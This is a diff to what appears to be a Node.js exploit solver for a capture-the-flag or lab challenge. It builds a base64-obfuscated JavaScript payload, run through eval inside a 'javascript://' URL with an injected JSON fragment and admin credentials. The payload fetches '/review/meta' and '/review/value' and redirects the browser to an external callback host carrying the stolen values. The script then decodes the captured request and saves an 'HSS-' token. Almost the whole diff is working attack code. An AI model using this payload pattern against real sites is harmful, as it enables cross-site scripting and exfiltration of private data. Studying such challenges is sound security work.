@@ -58,7 +58,7 @@ async function waitForService() {
 async function main() {
   await waitForService();
 
-  const js = `fetch('/review/value').then(r=>r.text()).then(t=>location=${JSON.stringify(callbackBase)}+'/?'+btoa(t))`;
+  const js = `Promise.all([fetch('/review/meta').then(r=>r.json()),fetch('/review/value').then(r=>r.text())]).then(([m,t])=>location=${JSON.stringify(callbackBase)}+'/?'+btoa(m.channel+':'+t))`;
   const encoded = Buffer.from(js).toString('base64');
   const payload = `javascript://admin.pk/;%250D%250A;eval(atob('${encoded}'))\",\"username\":\"admin\",\"pass\":\"P@ss`;
 
@@ -91,9 +91,10 @@ async function main() {
     for (const item of requests) {
       const rawUrl = item.url || '';
       const encodedValue = rawUrl.includes('?') ? rawUrl.split('?').pop() : '';
-      const found = Buffer.from(encodedValue, 'base64').toString('utf8');
+      const decoded = Buffer.from(encodedValue, 'base64').toString('utf8');
+      const found = decoded.includes(':') ? decoded.split(':').slice(1).join(':') : decoded;
       if (found.startsWith('HSS-')) {
-      fs.writeFileSync('/app/output/recovered_value.txt', `${found}\n`, { mode: 0o600 });
+        fs.writeFileSync('/app/output/recovered_value.txt', `${found}\n`, { mode: 0o600 });
       return;
       }
     }
